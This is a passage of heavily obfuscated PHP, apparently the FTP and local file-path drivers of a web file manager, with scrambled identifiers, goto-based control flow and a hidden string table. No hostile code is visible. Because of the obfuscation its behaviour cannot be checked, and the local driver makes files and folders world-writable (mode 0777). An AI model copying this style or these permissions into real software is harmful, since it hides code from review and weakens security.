$BœçİøÁÜÄ[$e§Ñ×„Ëì[1244]]; } } public function iconvApp($AÆ’ğ‚‚§Ç) { return $this->iconvTo($AÆ’ğ‚‚§Ç, $this->systemCharset, $this->appCharset); } public function iconvSystem($Cµ¾×Ã¾³) { return $this->iconvTo($Cµ¾×Ã¾³, $this->appCharset, $this->systemCharset); } public function getPathOuter($E–Ûé¬à·Û) { goto fÔÏÄÊáÉæ; EÏø¯˜È‹: if (substr($d­ÅùêÃÈ, 0, 2) == $Bà¬ÂóÏ÷¡[1245]) { $d­ÅùêÃÈ = BASIC_PATH . substr($d­ÅùêÃÈ, 2); } if (substr($E–Ûé¬à·Û, 0, 2) == $Bà¬ÂóÏ÷¡[1245]) { $E–Ûé¬à·Û = BASIC_PATH . substr($E–Ûé¬à·Û, 2); } $d­ÅùêÃÈ = KodIO::clear($d­ÅùêÃÈ); goto AœšøìÑñÛ; cİ¸óŞÍØÚ: return $this->pathDriver . $Bà¬ÂóÏ÷¡[8] . ltrim($E–Ûé¬à·Û, $Bà¬ÂóÏ÷¡[8]); goto a½ÛÈì—‡Ÿ; AœšøìÑñÛ: $E–Ûé¬à·Û = KodIO::clear($E–Ûé¬à·Û); $E–Ûé¬à·Û = substr($E–Ûé¬à·Û, strlen($d­ÅùêÃÈ)); if (empty($this->pathDriver)) { return $E–Ûé¬à·Û; } goto cİ¸óŞÍØÚ; fÔÏÄÊáÉæ: $Bà¬ÂóÏ÷¡ =& $_SERVER[œº]; $d­ÅùêÃÈ = $this->iconvApp($this->pathBase); $E–Ûé¬à·Û = $this->iconvApp($E–Ûé¬à·Û); goto EÏø¯˜È‹; a½ÛÈì—‡Ÿ: } private function _init($bß¬­È¶Âœ = array()) { $b’ ±ˆ†ìê =& $_SERVER[œº]; if (!function_exists($b’ ±ˆ†ìê[1246])) { throw new Exception(LNG($b’ ±ˆ†ìê[1247])); } $this->config = $bß¬­È¶Âœ; $this->charsetReset($bß¬­È¶Âœ); foreach ($bß¬­È¶Âœ as $BÓğ¾¯Ç­ï => $F„Í±¯£ˆ¶) { if (isset($this->{$BÓğ¾¯Ç­ï})) { $this->{$BÓğ¾¯Ç­ï} = $F„Í±¯£ˆ¶; } } return $this->_login($bß¬­È¶Âœ); } private function _login($DÄ¼¯Äïê) { goto B«°“ÀÈ…Ü; d©¤ÒÎİŸ°: $b½´„‰ÎÉ° = isset($f£¼¦°¦ [$e¸ƒ×ËÀŠÍ[174]]) && $f£¼¦°¦ [$e¸ƒ×ËÀŠÍ[174]] == $e¸ƒ×ËÀŠÍ[1248] ? !0 : !1; $this->scheme = $b½´„‰ÎÉ° ? $e¸ƒ×ËÀŠÍ[1249] : $e¸ƒ×ËÀŠÍ[1250]; $this->port = isset($f£¼¦°¦ [$e¸ƒ×ËÀŠÍ[176]]) ? $f£¼¦°¦ [$e¸ƒ×ËÀŠÍ[176]] : 21; goto e‹›š¾Ì¼; F´ì–Ğåƒ: $DÌË¸ğ‘ì®[$C±Î¾™¶—] = array($e¸ƒ×ËÀŠÍ[1251] => $this->connect, $e¸ƒ×ËÀŠÍ[175] => $this->host, $e¸ƒ×ËÀŠÍ[174] => $this->scheme, $e¸ƒ×ËÀŠÍ[176] => $this->port); return $aºŞí£¼•ª; goto e’£¤ğ®ˆ; e‹›š¾Ì¼: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $aºŞí£¼•ª = @ftp_login($this->connect, $this->username, $this->userpass); goto B”¬»¾¼ÄŠ; d‡·”ÙÅÓ–: if (isset($DÌË¸ğ‘ì®[$C±Î¾™¶—])) { foreach ($DÌË¸ğ‘ì®[$C±Î¾™¶—] as $AæÔè†ˆ“ => $fîÉÓé‹„) { $this->{$AæÔè†ˆ“} = $fîÉÓé‹„; } return !0; } $f£¼¦°¦  = parse_url(trim($this->server, $e¸ƒ×ËÀŠÍ[8])); $this->host = $f£¼¦°¦ [$e¸ƒ×ËÀŠÍ[175]]; goto d©¤ÒÎİŸ°; B”¬»¾¼ÄŠ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $c¼â—Ç‘Ò› = $this->pasv == $e¸ƒ×ËÀŠÍ[87] ? !0 : !1; @ftp_pasv($this->connect, $c¼â—Ç‘Ò›); goto F´ì–Ğåƒ; B«°“ÀÈ…Ü: $e¸ƒ×ËÀŠÍ =& $_SERVER[œº]; static $DÌË¸ğ‘ì® = array(); $C±Î¾™¶— = md5(json_encode($DÄ¼¯Äïê)); goto d‡·”ÙÅÓ–; e’£¤ğ®ˆ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($D‰ãç°¿ÃÉ, $DÄ£âˆÆ§ = '', $b•™Š“‡ÉÊ = REPEAT_RENAME) { if ($this->setContent($D‰ãç°¿ÃÉ, $DÄ£âˆÆ§)) { return $this->getPathOuter($D‰ãç°¿ÃÉ); } return !1; } public function mkdir($C²£‘”…Ù, $fÃ‰ÛñòÜÏ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $C²£‘”…Ù = $this->iconvSystem($C²£‘”…Ù); if ($this->_isFolder($C²£‘”…Ù) || @ftp_mkdir($this->connect, $C²£‘”…Ù)) { return $this->getPathOuter($C²£‘”…Ù); } if (!$this->mkdir($this->pathFather($C²£‘”…Ù))) { return !1; } if ($C²£‘”…Ù = @ftp_mkdir($this->connect, $C²£‘”…Ù)) { return $this->getPathOuter($C²£‘”…Ù); } return !1; } public function copyFile($dè˜íŸÔ‚è, $EÔÅ®¶Ò¼) { goto E Æ³ÎÂƒ±; bˆÒæÅ‡øª: $this->tempFileRemve($eåì”ê‡); return $dêòÌ¡â; goto d»¶Óï°; fßÇç½ùŠ: $fÈñ—ÜŒìù = $this->iconvApp($eåì”ê‡); $this->download($dè˜íŸÔ‚è, $fÈñ—ÜŒìù); $dêòÌ¡â = $this->upload($EÔÅ®¶Ò¼, $fÈñ—ÜŒìù); goto bˆÒæÅ‡øª; E Æ³ÎÂƒ±: if (!$this->_isconn()) { return !1; } $e±®´è¼Š = $this->pathThis($this->iconvSystem($dè˜íŸÔ‚è)); $eåì”ê‡ = $this->tempFile($e±®´è¼Š); goto fßÇç½ùŠ; d»¶Óï°: } public function moveFile($BåÙ×¡“ëÔ, $dÛõ¾æ°ßÀ) { if (!$this->_isconn()) { return !1; } $BåÙ×¡“ëÔ = $this->iconvSystem($BåÙ×¡“ëÔ); $dÛõ¾æ°ßÀ = $this->iconvSystem($dÛõ¾æ°ßÀ); $fèÌ¶–ëÛ = @ftp_rename($this->connect, $BåÙ×¡“ëÔ, $dÛõ¾æ°ßÀ); return $fèÌ¶–ëÛ ? $this->getPathOuter($dÛõ¾æ°ßÀ) : !1; } public function delFile($fš¤«åÛÔ½) { if (!$this->_isconn()) { return !1; } $fš¤«åÛÔ½ = $this->iconvSystem($fš¤«åÛÔ½); return @ftp_delete($this->connect, $fš¤«åÛÔ½); } public function delFolder($D„µ„ËŞô…) { goto b¢„­‘æ¬Ü; a÷Ÿå»ô„¤: foreach ($bØìøßŸô as $BÑ ÆµÉŒæ) { $BÑ ÆµÉŒæ = $this->iconvSystem($BÑ ÆµÉŒæ); $EŞÜÛ‡Åğá = @ftp_rmdir($this->connect, $BÑ ÆµÉŒæ); if (!$EŞÜÛ‡Åğá) { return !1; } } $D„µ„ËŞô… = $this->iconvSystem($D„µ„ËŞô…); return @ftp_rmdir($this->connect, $D„µ„ËŞô…); goto D¥¯Í´±’õ; DËÀÅº†Ö’: $this->fileList($D„µ„ËŞô…, $bØìøßŸô, $C…–Şøë·ª, !0); $this->listItemCache = !0; foreach ($C…–Şøë·ª as $c±Š“Šßîí) { $BÑ ÆµÉŒæ = $this->iconvSystem($c±Š“Šßîí[$_SERVER[œº][28]]); $EŞÜÛ‡Åğá = @ftp_delete($this->connect, $BÑ ÆµÉŒæ); if (!$EŞÜÛ‡Åğá) { return !1; } } goto a÷Ÿå»ô„¤; b¢„­‘æ¬Ü: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $bØìøßŸô = $C…–Şøë·ª = array(); goto DËÀÅº†Ö’; D¥¯Í´±’õ: } public function rename($E¿ÕÛ²„‹, $cñò‰èÉªÇ) { goto bï÷ÉËÔ³; Dë®ï¿Â±¤: $A›½Ã—¹òì = rtrim($f¹›«¨¤ÇÕ, $C·–ÙêŠÌ[8]) . $C·–ÙêŠÌ[8] . $d®‘˜¾©è’; $bºÈµìÊ‚­ = @ftp_rename($this->connect, $E¿ÕÛ²„‹, $A›½Ã—¹òì); $A›½Ã—¹òì = $this->iconvApp($A›½Ã—¹òì); goto bïÔ´Î¯å; bï÷ÉËÔ³: $C·–ÙêŠÌ =& $_SERVER[œº]; if (!$this->_isconn()) { return !1; } $d®‘˜¾©è’ = $this->fileNameAuto($this->pathFather($E¿ÕÛ²„‹), $cñò‰èÉªÇ); goto eåœêƒõš£; bïÔ´Î¯å: return $bºÈµìÊ‚­ ? $this->getPathOuter($A›½Ã—¹òì) : !1; goto c£ÚØÁîõÆ; eåœêƒõš£: $d®‘˜¾©è’ = $this->iconvSystem($d®‘˜¾©è’); $E¿ÕÛ²„‹ = $this->iconvSystem($E¿ÕÛ²„‹); $f¹›«¨¤ÇÕ = $this->pathFather($E¿ÕÛ²„‹); goto Dë®ï¿Â±¤; c£ÚØÁîõÆ: } private function folderInfo($EÌ®¦ÃÊŠ², $bô‘®Š»Ò = false) { $a¯ë¸²Ô =& $_SERVER[œº]; $F¢ÔïğÑ×Å = array($a¯ë¸²Ô[28] => $this->pathThis($EÌ®¦ÃÊŠ²), $a¯ë¸²Ô[76] => $this->getPathOuter($a¯ë¸²Ô[8] . $EÌ®¦ÃÊŠ²), $a¯ë¸²Ô[29] => $a¯ë¸²Ô[77]); if ($bô‘®Š»Ò) { return $F¢ÔïğÑ×Å; } $F¢ÔïğÑ×Å[$a¯ë¸²Ô[194]] = $F¢ÔïğÑ×Å[$a¯ë¸²Ô[84]] = 0; $F¢ÔïğÑ×Å[$a¯ë¸²Ô[195]] = $F¢ÔïğÑ×Å[$a¯ë¸²Ô[196]] = !0; return $F¢ÔïğÑ×Å; } private function fileInfo($eÔÅÎÖµøˆ, $d­æè‚“¡ï = false, $c£°¶¡øÇæ = array()) { goto a†˜ò‚¹Ç; bæÓ”ÊœÇŠ: $A„‚îÌ¹ì[$fìñš¸åÉ[194]] = $A„‚îÌ¹ì[$fìñš¸åÉ[84]] = 0; $A„‚îÌ¹ì[$fìñš¸åÉ[195]] = $A„‚îÌ¹ì[$fìñš¸åÉ[196]] = !0; $CÅ¼ƒ¶µÌÊ = $this->iconvSystem($eÔÅÎÖµøˆ); goto D¼í–„; a†˜ò‚¹Ç: $fìñš¸åÉ =& $_SERVER[œº]; $A„‚îÌ¹ì = array($fìñš¸åÉ[28] => $this->pathThis($eÔÅÎÖµøˆ), $fìñš¸åÉ[76] => $this->getPathOuter($fìñš¸åÉ[8] . $eÔÅÎÖµøˆ), $fìñš¸åÉ[29] => $fìñš¸åÉ[193], $fìñš¸åÉ[78] => isset($c£°¶¡øÇæ[$fìñš¸åÉ[78]]) ? $c£°¶¡øÇæ[$fìñš¸åÉ[78]] : 0, $fìñš¸åÉ[168] => $this->ext($eÔÅÎÖµøˆ)); if ($d­æè‚“¡ï) { return $A„‚îÌ¹ì; } goto bæÓ”ÊœÇŠ; b¸åÂãàÜƒ: return $A„‚îÌ¹ì; goto CİÃÊ¬øå; D¼í–„: $A„‚îÌ¹ì[$fìñš¸åÉ[84]] = @ftp_mdtm($this->connect, $CÅ¼ƒ¶µÌÊ); if (empty($c£°¶¡øÇæ)) { $c£°¶¡øÇæ = $this->objectMeta($eÔÅÎÖµøˆ); if (!$c£°¶¡øÇæ) { return $A„‚îÌ¹ì; } } $A„‚îÌ¹ì[$fìñš¸åÉ[78]] = $c£°¶¡øÇæ[$fìñš¸åÉ[78]]; goto b¸åÂãàÜƒ; CİÃÊ¬øå: } public function size($f“Ùí˜ßÊ„) { $FÆñê¼¯Õ¹ = $this->objectMeta($f“Ùí˜ßÊ„); return $FÆñê¼¯Õ¹ ? $FÆñê¼¯Õ¹[$_SERVER[œº][78]] : 0; } public function info($cö·¶é¾µ) { if ($this->isFile($cö·¶é¾µ)) { return $this->fileInfo($cö·¶é¾µ, 0); } else { if ($this->isFolder($cö·¶é¾µ)) { return $this->folderInfo($cö·¶é¾µ); } } return !1; } private function fileList($A–è¿ÆÒÚí, &$BÅíÑŠ†Öä, &$a©Óì , $BÔÆ“˜´¶‚ = false) { goto cÃ‰‡å¿ë; cÃ‰‡å¿ë: $e¢æŸ˜Ã¥© =& $_SERVER[œº]; $A–è¿ÆÒÚí = $this->iconvSystem($A–è¿ÆÒÚí); if (!$this->isFolder($A–è¿ÆÒÚí)) { return !1; } goto a»ÓÈŒ†§ß; a»ÓÈŒ†§ß: @ftp_chdir($this->connect, $e¢æŸ˜Ã¥©[8]); $A–è¿ÆÒÚí = rtrim($A–è¿ÆÒÚí, $e¢æŸ˜Ã¥©[8]) . $e¢æŸ˜Ã¥©[8]; check_abort(); goto eğ£± íâ–; eğ£± íâ–: $D¾—ÏÑ—¼İ = $this->listItemCache === !1 ? !1 : !0; $DÜ—àíŸ°Û = @ftp_rawlist($this->connect, $A–è¿ÆÒÚí); if (!$DÜ—àíŸ°Û) { $DÜ—àíŸ°Û = array(); } goto f¸‹½˜áŞ; f¸‹½˜áŞ: $cêê‹İœ¯÷ = array($e¢æŸ˜Ã¥©[95] => 1, $e¢æŸ˜Ã¥©[1252] => 1); foreach ($DÜ—àíŸ°Û as $FßÔë·¹ŞÄ) { goto BåÜÈ¾–îé; BåÜÈ¾–îé: $AËÑÊ°ó»˜ = $this->_listItem($FßÔë·¹ŞÄ); if ($AËÑÊ°ó»˜[0] == $e¢æŸ˜Ã¥©[719]) { continue; } $cœêƒœ¼ƒÊ = $AËÑÊ°ó»˜[8]; goto CªÎòÆ¸âİ; DÕ’¶•´°¼: if (substr($FßÔë·¹ŞÄ, 0, 1) == $e¢æŸ˜Ã¥©[1253]) { $EƒÕî½·…›[$e¢æŸ˜Ã¥©[29]] = $e¢æŸ˜Ã¥©[77]; $EƒÕî½·…›[$e¢æŸ˜Ã¥©[78]] = 0; } $cÎÒŞìÖ…Å = $EƒÕî½·…›[$e¢æŸ˜Ã¥©[29]] == $e¢æŸ˜Ã¥©[77] ? !0 : !1; if ($D¾—ÏÑ—¼İ) { $this->cacheMethod($e¢æŸ˜Ã¥©[199], $cœêƒœ¼ƒÊ, $cÎÒŞìÖ…Å); $this->cacheMethod($e¢æŸ˜Ã¥©[200], $cœêƒœ¼ƒÊ, $EƒÕî½·…›); } goto cà»õèĞÈ; cà»õèĞÈ: if ($cÎÒŞìÖ…Å) { $BÅíÑŠ†Öä[] = $cœêƒœ¼ƒÊ; if ($BÔÆ“˜´¶‚) { $this->fileList($cœêƒœ¼ƒÊ, $BÅíÑŠ†Öä, $a©Óì , $BÔÆ“˜´¶‚); } continue; } $a©Óì [] = $EƒÕî½·…›; goto A¸®››ñì„; CªÎòÆ¸âİ: if (empty($cœêƒœ¼ƒÊ) && $cœêƒœ¼ƒÊ !== $e¢æŸ˜Ã¥©[191] || isset($cêê‹İœ¯÷[$cœêƒœ¼ƒÊ])) { continue; } $cœêƒœ¼ƒÊ = $this->iconvApp($A–è¿ÆÒÚí . ltrim($cœêƒœ¼ƒÊ, $e¢æŸ˜Ã¥©[8])); $EƒÕî½·…› = array($e¢æŸ˜Ã¥©[28] => $cœêƒœ¼ƒÊ, $e¢æŸ˜Ã¥©[29] => $e¢æŸ˜Ã¥©[193], $e¢æŸ˜Ã¥©[78] => $AËÑÊ°ó»˜[4]); goto DÕ’¶•´°¼; A¸®››ñì„: } if ($D¾—ÏÑ—¼İ) { $this->cacheMethod($e¢æŸ˜Ã¥©[199], $A–è¿ÆÒÚí, !0); } goto f»‘‰èä³±; f»‘‰èä³±: } private function _listItem($A³†®ŒÉò) { if (empty($A³†®ŒÉò)) { return array(); } $BæôÚÂÌ  = preg_split($_SERVER[œº][1254], $A³†®ŒÉò); if (count($BæôÚÂÌ ) <= 9) { return $BæôÚÂÌ ; } $BæôÚÂÌ [8] = trim(substr($A³†®ŒÉò, strpos($A³†®ŒÉò, $BæôÚÂÌ [7]) + strlen($BæôÚÂÌ [7]))); return array_splice($BæôÚÂÌ , 0, 9); } public function listPath($CéŒƒ•¤î—, $aÇœÓ´‹Ğ = false) { goto dØš–øºŒß; bù¾Ê©Ş³·: return array($F­Ğ¹ŞÏ[75] => $bØÇøó„È, $F­Ğ¹ŞÏ[74] => $dá–°Ôâ³ğ); goto dÌöóÌ·õ; Eø¹â»ê†: $this->fileList($CéŒƒ•¤î—, $bØÇøó„È, $dá–°Ôâ³ğ); foreach ($bØÇøó„È as $d„…‡’ŞëÇ => $f«ˆ–›É×) { $bØÇøó„È[$d„…‡’ŞëÇ] = $this->folderInfo($f«ˆ–›É×, $aÇœÓ´‹Ğ); } foreach ($dá–°Ôâ³ğ as $d„…‡’ŞëÇ => $f«ˆ–›É×) { $dá–°Ôâ³ğ[$d„…‡’ŞëÇ] = $this->fileInfo($f«ˆ–›É×[$F­Ğ¹ŞÏ[28]], $aÇœÓ´‹Ğ, $f«ˆ–›É×); } goto bù¾Ê©Ş³·; dØš–øºŒß: $F­Ğ¹ŞÏ =& $_SERVER[œº]; if (!$this->_isconn()) { return !1; } $bØÇøó„È = $dá–°Ôâ³ğ = array(); goto Eø¹â»ê†; dÌöóÌ·õ: } public function has($CÔå¹Ğ¬×ˆ, $EœÉááƒÍ = false, $b éë’Šì = true) { goto a¬ßõ™¢¸à; c›Ü‡˜ô™ˆ: $this->fileList($CÔå¹Ğ¬×ˆ, $Bèòµˆİ·ô, $EŒ°ô—“Ó, $b¤´ï°Û‰); if ($EœÉááƒÍ) { return array($B™ßëôøÛ„[203] => count($EŒ°ô—“Ó), $B™ßëôøÛ„[204] => count($Bèòµˆİ·ô)); } if ($b éë’Šì) { if (count($EŒ°ô—“Ó)) { return !0; } } else { if (count($Bèòµˆİ·ô)) { return !0; } } goto cŒÊ¬²±Õ®; a¬ßõ™¢¸à: $B™ßëôøÛ„ =& $_SERVER[œº]; $Bèòµˆİ·ô = $EŒ°ô—“Ó = array(); $b¤´ï°Û‰ = $EœÉááƒÍ ? !0 : !1; goto c›Ü‡˜ô™ˆ; cŒÊ¬²±Õ®: return !1; goto A§ÑïÆ”¯™; A§ÑïÆ”¯™: } public function listAll($b‹Ü¤è»ä‡) { goto AÍ¤¢†¦Ì™; e«š¦ƒø„: foreach ($e•¶ùåÑ’× as $fòé¼Á÷ƒ¸) { if (is_string($fòé¼Á÷ƒ¸)) { $aÔ˜ÊÙ…¹ø[$fòé¼Á÷ƒ¸] = 0; } } return $this->listAllFiles($b‹Ü¤è»ä‡, array_keys($aÔ˜ÊÙ…¹ø), $aÔ˜ÊÙ…¹ø); goto c‚ÙÀôŠ‹¶; b›¿ÜÊ•®Š: $this->fileList($b‹Ü¤è»ä‡, $e•¶ùåÑ’×, $e­Ò†ƒî­¤, !0); $aÔ˜ÊÙ…¹ø = array(); foreach ($e­Ò†ƒî­¤ as $fòé¼Á÷ƒ¸) { $aÔ˜ÊÙ…¹ø[$fòé¼Á÷ƒ¸[$A›ÀÉôÆ¬†[28]]] = $fòé¼Á÷ƒ¸[$A›ÀÉôÆ¬†[78]]; } goto e«š¦ƒø„; AÍ¤¢†¦Ì™: $A›ÀÉôÆ¬† =& $_SERVER[œº]; if (!$this->_isconn()) { return !1; } $e•¶ùåÑ’× = $e­Ò†ƒî­¤ = array(); goto b›¿ÜÊ•®Š; c‚ÙÀôŠ‹¶: } public function getContent($FÛ¨Éñ¼ÄÅ) { if (!$this->_isconn()) { return !1; } $FÛ¨Éñ¼ÄÅ = $this->iconvSystem($FÛ¨Éñ¼ÄÅ); return $this->fileSubstr($FÛ¨Éñ¼ÄÅ); } public function setContent($có¢‰™³ì³, $FÇÅ…¨Ö‡¼ = '') { goto bé‹¨¸ÉÃ‡; eÅÊ£Å–É†: return $DèËâ¥Æö; goto E¶ñ†‚åË°; cÀÇÅ¹¢ó: file_put_contents($bÆßö²Ü, $FÇÅ…¨Ö‡¼); $DèËâ¥Æö = $this->upload($có¢‰™³ì³, $this->iconvApp($bÆßö²Ü)); $this->tempFileRemve($bÆßö²Ü); goto eÅÊ£Å–É†; bé‹¨¸ÉÃ‡: if (!$this->_isconn()) { return !1; } $E÷®ë®§É = $this->pathThis($this->iconvSystem($có¢‰™³ì³)); $bÆßö²Ü = $this->tempFile($E÷®ë®§É); goto cÀÇÅ¹¢ó; E¶ñ†‚åË°: } public function fileSubstr($b»½Ï‘‡¼Ç, $dï‚¥Å„Ë = 0, $C‘©³äÓÜ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($b»½Ï‘‡¼Ç, $dï‚¥Å„Ë, $C‘©³äÓÜ); } private function ftpRequest($d‹ãáõ©ñİ, $CŸ‡¼âİ’ƒ = 0, $BŠÄ•ğä¤ó = false) { goto E”‰³‹¤…Õ; cƒŠĞÑ…ë¾: return $BœØ«ï “Æ; goto e°ó¹’‹‘Å; fâ¿Ğ÷ôïå: curl_setopt($cøÄ–ªÎÚë, CURLOPT_RETURNTRANSFER, 1); $BœØ«ï “Æ = curl_exec($cøÄ–ªÎÚë); curl_close($cøÄ–ªÎÚë); goto cƒŠĞÑ…ë¾; Eá‡Æ¯ÀÛŠ: curl_setopt($cøÄ–ªÎÚë, CURLOPT_URL, $C’…÷Û®™Î . $this->pathEncode($d‹ãáõ©ñİ)); curl_setopt($cøÄ–ªÎÚë, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($BŠÄ•ğä¤ó) { $Fº˜î‹µ† = $CŸ‡¼âİ’ƒ + $BŠÄ•ğä¤ó - 1; curl_setopt($cøÄ–ªÎÚë, CURLOPT_RANGE, "{$CŸ‡¼âİ’ƒ}\x2d{$Fº˜î‹µ†}"); } goto fâ¿Ğ÷ôïå; E”‰³‹¤…Õ: $d‹ãáõ©ñİ = $this->iconvSystem($d‹ãáõ©ñİ); $C’…÷Û®™Î = $this->scheme . $this->host . $_SERVER[œº][4] . $this->port; $cøÄ–ªÎÚë = curl_init(); goto Eá‡Æ¯ÀÛŠ; e°ó¹’‹‘Å: } public function upload($aœ†÷Õëˆõ, $cñ¼ÂõÊÈë, $c‰ÀË‰Ğ‚¥ = false, $d¾†–ä’ùÌ = REPEAT_REPLACE) { goto AÈò‰áİ; b‹ÇËˆù³·: $cñ¼ÂõÊÈë = $this->iconvSystem($cñ¼ÂõÊÈë); $EçºË¬„åİ = ftp_nb_put($this->connect, $aœ†÷Õëˆõ, $cñ¼ÂõÊÈë, FTP_BINARY); while ($EçºË¬„åİ == FTP_MOREDATA) { $EçºË¬„åİ = ftp_nb_continue($this->connect); } goto c‡Šº÷¢Û•; AÈò‰áİ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($aœ†÷Õëˆõ))) { return !1; } $aœ†÷Õëˆõ = $this->iconvSystem($aœ†÷Õëˆõ); goto b‹ÇËˆù³·; c‡Šº÷¢Û•: if ($EçºË¬„åİ != FTP_FINISHED) { return !1; } return $this->getPathOuter($aœ†÷Õëˆõ); goto añ¶É¯ëç™; añ¶É¯ëç™: } public function download($B”ĞêŸã, $E·‹ƒÀ—•É = '') { goto Cæİİ‘Ğ¦ç; bİªß«é: $B”ĞêŸã = $this->iconvSystem($B”ĞêŸã); $E·‹ƒÀ—•É = $this->iconvSystem($E·‹ƒÀ—•É); $F™…¡Ç¦¿É = ftp_nb_get($this->connect, $E·‹ƒÀ—•É, $B”ĞêŸã, FTP_BINARY); goto E­Ğ¢Êï­‹; E­Ğ¢Êï­‹: while ($F™…¡Ç¦¿É == FTP_MOREDATA) { $F™…¡Ç¦¿É = ftp_nb_continue($this->connect); } if ($F™…¡Ç¦¿É != FTP_FINISHED) { return !1; } return $this->iconvApp($E·‹ƒÀ—•É); goto cïœœå•‘; Cæİİ‘Ğ¦ç: if (!$this->_isconn()) { return !1; } $B£‡êº´¬ß = $this->pathFather($E·‹ƒÀ—•É); if (!IO::mkdir($B£‡êº´¬ß)) { return !1; } goto bİªß«é; cïœœå•‘: } public function exist($báùâ˜Œàé) { return $this->isFile($báùâ˜Œàé) || $this->isFolder($báùâ˜Œàé); } public function isFile($CóéÜá—óÄ) { return !$this->isFolder($CóéÜá—óÄ) && $this->objectMeta($CóéÜá—óÄ); } public function isFolder($bÁÜèÂ³ƒÀ) { return $this->cacheMethod($_SERVER[œº][199], $bÁÜèÂ³ƒÀ); } protected function objectMeta($D²õ¶ÓÄ¦–) { return $this->cacheMethod($_SERVER[œº][200], $D²õ¶ÓÄ¦–); } protected function _objectMeta($E¬ĞšÑ‘Óë) { goto F¶„ˆÇÖÇË; dª°°«›Šê: $E»‚‰¸É‘ô = @ftp_size($this->connect, $E¬ĞšÑ‘Óë); if ($E»‚‰¸É‘ô != -1) { $b‘¸Á”øïÙ[$cÊ¶ªÙöË[78]] = $E»‚‰¸É‘ô; } else { $f÷ºšŸ¤…Š = @ftp_chdir($this->connect, $E¬ĞšÑ‘Óë); if (!$f÷ºšŸ¤…Š) { return !1; } $b‘¸Á”øïÙ[$cÊ¶ªÙöË[29]] = $cÊ¶ªÙöË[77]; } return $b‘¸Á”øïÙ; goto BŠÖ Ã®©Š; F¶„ˆÇÖÇË: $cÊ¶ªÙöË =& $_SERVER[œº]; if ($E¬ĞšÑ‘Óë == $cÊ¶ªÙöË[33] || $E¬ĞšÑ‘Óë == $cÊ¶ªÙöË[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto E«ŒñåÜ„ì; E«ŒñåÜ„ì: $E¬ĞšÑ‘Óë = $this->iconvSystem($E¬ĞšÑ‘Óë); $b‘¸Á”øïÙ = array($cÊ¶ªÙöË[28] => $this->iconvApp($E¬ĞšÑ‘Óë), $cÊ¶ªÙöË[29] => $cÊ¶ªÙöË[193], $cÊ¶ªÙöË[78] => 0); @ftp_chdir($this->connect, $cÊ¶ªÙöË[8]); goto dª°°«›Šê; BŠÖ Ã®©Š: } protected function _isFolder($f³¾¢Ÿöæì) { $A‰ÉÖ’¥í‚ =& $_SERVER[œº]; if ($f³¾¢Ÿöæì == $A‰ÉÖ’¥í‚[33] || $f³¾¢Ÿöæì == $A‰ÉÖ’¥í‚[8]) { return !0; } $cìŸ²¤¥—Æ = $this->_objectMeta($f³¾¢Ÿöæì); return isset($cìŸ²¤¥—Æ[$A‰ÉÖ’¥í‚[29]]) && $cìŸ²¤¥—Æ[$A‰ÉÖ’¥í‚[29]] == $A‰ÉÖ’¥í‚[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($bÒáÃ÷‡²Ê) { if (substr($bÒáÃ÷‡²Ê, 0, 2) == $_SERVER[œº][1245]) { $bÒáÃ÷‡²Ê = BASIC_PATH . substr($bÒáÃ÷‡²Ê, 2); } return $bÒáÃ÷‡²Ê; } public function iconvApp($E—‡²‹îì³) { $Bœ‘À¹©£Ç =& $_SERVER[œº]; global $config; return $this->iconvTo($E—‡²‹îì³, $config[$Bœ‘À¹©£Ç[1243]], $config[$Bœ‘À¹©£Ç[1242]]); } public function iconvSystem($c¸£ ËÓ¯†) { $b½«‡„’ô¡ =& $_SERVER[œº]; global $config; return $this->iconvTo($c¸£ ËÓ¯†, $config[$b½«‡„’ô¡[1242]], $config[$b½«‡„’ô¡[1243]]); } public function getPathOuter($fñ„¶á÷ƒí) { goto e„ó–äÚœ½; e„ó–äÚœ½: $e©‰êŒ÷É¡ =& $_SERVER[œº]; $EÓ·ß‡ëñ = $this->iconvApp($this->pathBase); $fñ„¶á÷ƒí = $this->iconvApp($fñ„¶á÷ƒí); goto D‚¾„ëšë„; D‚¾„ëšë„: if (substr($EÓ·ß‡ëñ, 0, 2) == $e©‰êŒ÷É¡[1245]) { $EÓ·ß‡ëñ = BASIC_PATH . substr($EÓ·ß‡ëñ, 2); } if (substr($fñ„¶á÷ƒí, 0, 2) == $e©‰êŒ÷É¡[1245]) { $fñ„¶á÷ƒí = BASIC_PATH . substr($fñ„¶á÷ƒí, 2); } $EÓ·ß‡ëñ = KodIO::clear($EÓ·ß‡ëñ); goto d—¿ßÜÏ¼±; d—¿ßÜÏ¼±: $fñ„¶á÷ƒí = KodIO::clear($fñ„¶á÷ƒí); $fñ„¶á÷ƒí = substr($fñ„¶á÷ƒí, strlen($EÓ·ß‡ëñ)); if (empty($this->pathDriver)) { return $fñ„¶á÷ƒí; } goto A¶Ô¼Â‰òà; A¶Ô¼Â‰òà: return $this->pathDriver . $e©‰êŒ÷É¡[8] . ltrim($fñ„¶á÷ƒí, $e©‰êŒ÷É¡[8]); goto bÓÃˆ‰¢‹ê; bÓÃˆ‰¢‹ê: } public function mkfile($B‰´ºßØ, $cŠ©¿ŒƒâÍ = '', $AÍ¤Ù‡â…¾ = REPEAT_RENAME) { $B‰´ºßØ = $this->iconvSystem($B‰´ºßØ); @touch($B‰´ºßØ); if ($cŠ©¿ŒƒâÍ) { file_put_contents($B‰´ºßØ, $cŠ©¿ŒƒâÍ); } @chmod($B‰´ºßØ, 511); return is_file($B‰´ºßØ) ? $this->getPathOuter($B‰´ºßØ) : !1; } public function mkdir($Aéêİ¿»¬, $döšºÅïĞ… = REPEAT_SKIP) { $Aéêİ¿»¬ = $this->iconvSystem($Aéêİ¿»¬); if (is_dir($Aéêİ¿»¬)) { return $this->getPathOuter($Aéêİ¿»¬); } @mkdir($Aéêİ¿»¬, 511, !0); @chmod($Aéêİ¿»¬, 511); return is_dir($Aéêİ¿»¬) ? $this->getPathOuter($Aéêİ¿»¬) : !1; } public function 